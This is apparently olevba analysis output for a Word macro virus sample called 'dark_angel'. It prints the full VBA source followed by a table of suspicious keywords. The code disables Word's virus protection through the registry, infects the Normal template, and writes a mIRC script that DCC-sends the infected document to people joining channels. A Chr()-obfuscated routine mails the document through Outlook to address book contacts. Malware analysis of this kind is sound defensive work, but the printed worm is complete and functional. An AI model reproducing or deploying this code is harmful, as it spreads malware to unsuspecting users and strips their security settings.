olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tech.g-4607296c0b104d31a5008d8aa7eedd0e331abf18
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tech.g-4607296c0b104d31a5008d8aa7eedd0e331abf18 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DarkAngel.bas 
in file: Virus.MSWord.Tech.g-4607296c0b104d31a5008d8aa7eedd0e331abf18 - OLE stream: 'Macros/VBA/DarkAngel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Private Sub Document_Open()
On Error Resume Next
'dark_angel Macro Virus (c) by Energy
'Thx to Necronomikon[Zer0Gravity] for help
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
Application.ShowVisualBasicEditor = (Rnd * 0)
Application.VBE.ActiveVBProject.VBComponents("darkangel").Export "c:\windows\darkangel.dll"
Options.ConfirmConversions = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
Options.VirusProtection = (Rnd * 0)
Set FSO = CreateObject("Scripting.FileSystemObject")
Set dirwin = FSO.GetSpecialFolder(0)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
 If regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\darkangel") <> "by Energy" Then
  user = regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
  ActiveDocument.SaveAs FileName:=dirwin & "\darkangel.doc", FileFormat:=wdFormatDocument
  If ToolsWordCount.Count <= 500 Then
    For A = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(A).Name = "darkangel" Then NormInstall = True
            Next A
    For A = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(A).Name = "darkangel" Then ActivInstall = True
            Next A
        If ActivInstall = True And NormInstall = False Then Set Secj = NormalTemplate.VBProject _
            Else If ActivInstall = False And NormInstall = True Then Set Secj = ActiveDocument.VBProject
End If
RRKP1$ = Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(32) + ""
Chr (61) + Chr(32) + Chr(67) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(79) + Chr(98) + Chr(106) + Chr(101) + Chr(99) + ""
Chr (116) + Chr(40) + Chr(34) + Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + ""
Chr (112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(34) + Chr(41) + Chr(13) + Chr(10) + ""
Chr (32) + Chr(32) + Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(77) + Chr(65) + Chr(80) + Chr(73) + Chr(32) + Chr(61) + Chr(32) + Chr(79) + ""
Chr (117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(71) + Chr(101) + Chr(116) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + ""
Chr (83) + Chr(112) + Chr(97) + Chr(99) + Chr(101) + Chr(40) + Chr(34) + Chr(77) + Chr(65) + Chr(80) + Chr(73) + Chr(34) + Chr(41) + Chr(13) + Chr(10) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(77) + Chr(65) + Chr(80) + Chr(73) + Chr(46) + Chr(76) + Chr(111) + Chr(103) + Chr(111) + ""
Chr (110) + Chr(32) + Chr(34) + Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(34) + Chr(44) + Chr(32) + Chr(34) + Chr(112) + ""
Chr (97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) + Chr(34) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(89) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(77) + ""
Chr (65) + Chr(80) + Chr(73) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(76) + Chr(105) + Chr(115) + Chr(116) + ""
Chr (115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(65) + Chr(100) + Chr(100) + Chr(121) + Ch(66) + Chr(111) + ""
Chr (111) + Chr(107) + Chr(32) + Chr(61) + Chr(32) + Chr(77) + Chr(65) + Chr(80) + Chr(73) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(114) + ""
Chr (101) + Chr(115) + Chr(115) + Chr(76) + Chr(105) + Chr(115) + Chr(116) + Chr(115) + Chr(40) + Chr(89) + Chr(41) + Chr(13) + Chr(10) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(88) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(13) + ""
Chr (10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(83) + Chr(101) + Chr(116) + Chr(32) + ""
Chr (79) + Chr(117) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + ""
Chr (67) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(73) + Chr(116) + Chr(101) + Chr(109) + Chr(40) + Chr(48) + Chr(41) + Chr(13) + Chr(10) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(111) + Chr(114) + Chr(32) + Chr(111) + Chr(111) + Chr(32) + Chr(61) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(70)
Chr (49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(65) + Chr(100) + Chr(100) + Chr(121) + Chr(66) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + ""
Chr (100) + Chr(100) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(69) + Chr(110) + Chr(116) + Chr(114) + Chr(105) + Chr(101) + Chr(115) + Chr(46) + Chr(67) + ""
Chr (111) + Chr(117) + Chr(110) + Chr(116) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(77) + Chr(97) + Chr(105) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(65) + Chr(100) + Chr(100) + Chr(121) + Chr(66) + ""
Chr (111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(69) + Chr(110) + Chr(116) + Chr(114) + ""
Chr (105) + Chr(101) + Chr(115) + Chr(40) + Chr(88) + Chr(41) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(82) + Chr(101) + Chr(99) + Chr(105) + Chr(112) + Chr(105) + Chr(101) + Chr(110) + ""
Chr (116) + Chr(115) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(32) + Chr(77) + Chr(97) + Chr(105) + Chr(108) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(88) + Chr(32) + Chr(61) + Chr(32) + Chr(88) + Chr(32) + Chr(43) + ""
Chr (32) + Chr(49) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(73) + Chr(102) + Chr(32) + Chr(88) + Chr(32) + Chr(62) + Chr(32) + Chr(51) + Chr(48) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(111) + ""
Chr (111) + Chr(32) + Chr(61) + Chr(32) + Chr(65) + Chr(100) + Chr(100) + Chr(121) + Chr(66) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(114) + Chr(101) + ""
Chr (115) + Chr(115) + Chr(69) + Chr(110) + Chr(116) + Chr(114) + Chr(105) + Chr(101) + Chr(115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116) + Chr(13) + ""
Chr (10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + ""
Chr (111) + Chr(111) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + ""
Chr (116) + Chr(46) + Chr(83) + Chr(117) + Chr(98) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(82) + Chr(69) + Chr(58) + Chr(34) + ""
Chr (13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + ""
Chr (66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(84) + Chr(104) + Chr(101) + Chr(32) + Chr(84) + ""
Chr (114) + Chr(117) + Chr(101) + Chr(32) + Chr(84) + Chr(105) + Chr(109) + Chr(101) + Chr(32) + Chr(83) + Chr(116) + Chr(111) + Chr(114) + ""
Chr (121) + Chr(32) + Chr(97) + Chr(98) + Chr(111) + Chr(117) + Chr(116) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(84) + Chr(86) + ""
Chr (32) + Chr(83) + Chr(101) + Chr(114) + Chr(105) + Chr(101) + Chr(32) + Chr(68) + Chr(97) + Chr(114) + Chr(107) + Chr(32) + Chr(65) + Chr(110) + Chr(103) + Chr(101) + ""
Chr (108) + Chr(34) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + ""
Chr (46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(61) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(38) + ""
Chr (32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + Chr(32) + Chr(38) + Chr(32) + Chr(34) + Chr(34) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(61) + Chr(32) + ""
Chr (79) + Chr(117) + Chr(116) + Chr(46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(38) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + ""
Chr (32) + Chr(38) + Chr(32) + Chr(34) + Chr(86) + Chr(105) + Chr(115) + Chr(105) + Chr(116) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(68) + Chr(97) + Chr(114) + Chr(107) + ""
Chr (65) + Chr(110) + Chr(103) + Chr(101) + Chr(108) + Chr(46) + Chr(100) + Chr(111) + Chr(99) + Chr(44) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + ""
Chr (32) + Chr(99) + Chr(97) + Chr(110) + Chr(32) + Chr(115) + Chr(101) + Chr(101) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(83) + Chr(116) + Chr(111) + Chr(114) + Chr(121) + ""
Chr (32) + Chr(97) + Chr(98) + Chr(111) + Chr(117) + Chr(116) + Chr(32) + Chr(74) + Chr(97) + Chr(109) + Chr(101) + ""
Chr (115) + Chr(32) + Chr(67) + Chr(97) + Chr(109) + Chr(101) + Chr(114) + Chr(111) + Chr(110) + Chr(180) + Chr(115) + Chr(32) + Chr(68) + Chr(97) + Chr(114) + Chr(107) + Chr(32) + Chr(65) + ""
Chr (110) + Chr(103) + Chr(101) + Chr(108) + Chr(34) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + ""
Chr (117) + Chr(116) + Chr(46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + Chr(32) + Chr(61) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(66) + Chr(111) + Chr(100) + Chr(121) + ""
Chr (32) + Chr(38) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + Chr(32) + Chr(38) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + Chr(32) + ""
Chr (38) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + Chr(32) + Chr(38) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(76) + Chr(102) + Ch(13) + Chr(10) + Chr(32) + ""
Chr (32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(65) + Chr(116) + Chr(116) + Chr(97) + Chr(99) + ""
Chr (104) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(32) + Chr(40) + Chr(100) + Chr(105) + Chr(114) + Chr(119) + Chr(105) + Chr(110) + ""
Chr (32) + Chr(38) + Chr(32) + Chr(34) + Chr(92) + Chr(100) + Chr(97) + Chr(114) + Chr(107) + Chr(97) + Chr(110) + Chr(103) + Chr(101) + Chr(108) + Chr(46) + Chr(100) + Chr(111) + Chr(99) + Chr(34) + ""
Chr (41) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + Chr(68) + Chr(101) + ""
Chr (108) + Chr(101) + Chr(116) + Chr(101) + Chr(65) + Chr(102) + Chr(116) + Chr(101) + Chr(114) + Chr(83) + Chr(117) + Chr(98) + Chr(109) + Chr(105) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + ""
Chr (114) + Chr(117) + Chr(101) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(79) + Chr(117) + Chr(116) + Chr(46) + ""
Chr (83) + Chr(101) + Chr(110) + Chr(100) + Chr(13) + Chr(10) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(77) + Chr(97) + Chr(105) + ""
Chr (108) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(34)
Final611$ = RRKP1$ & OAYR2$
ActiveDocument.SaveAs Environ("WINDIR") & "\darkangel.doc"
SetAttr "C:\Windows\darkangel.doc", vbReadOnly
SetAttr "C:\windows\darkangel.dll", vbReadOnly
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:text:   *:?:{ s *2 | halt }"
Print #1, "n1=alias /s / *"
Print #1, "n2=on 1:connect:/.enable #d"
Print #1, "n3=#d off"
Print #1, "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick ""c:\windows\darkangel.doc"" } | .disable #d | .timer 1 30 .enable #d }"
Print #1, "n5=#d end"
Close #1
Secj.VBComponents.Import ("c:\windows\darkangel.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
      Next Y
      MAPI.Logoff
      regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\darkangel", "(c) by Energy@rRlf.de"
 End If
End Sub
Private Sub Document_Close()
Dim M
M = Int((3 * Rnd) + 1)
 If M = 2 Then
  msg = "Dark Angel (Jessica Alba)" & vbCrLf & "(c) by Energy"
  MsgBox msg, vbCritical, "please retype DarkAngel.doc"
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |darkangel.dll       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

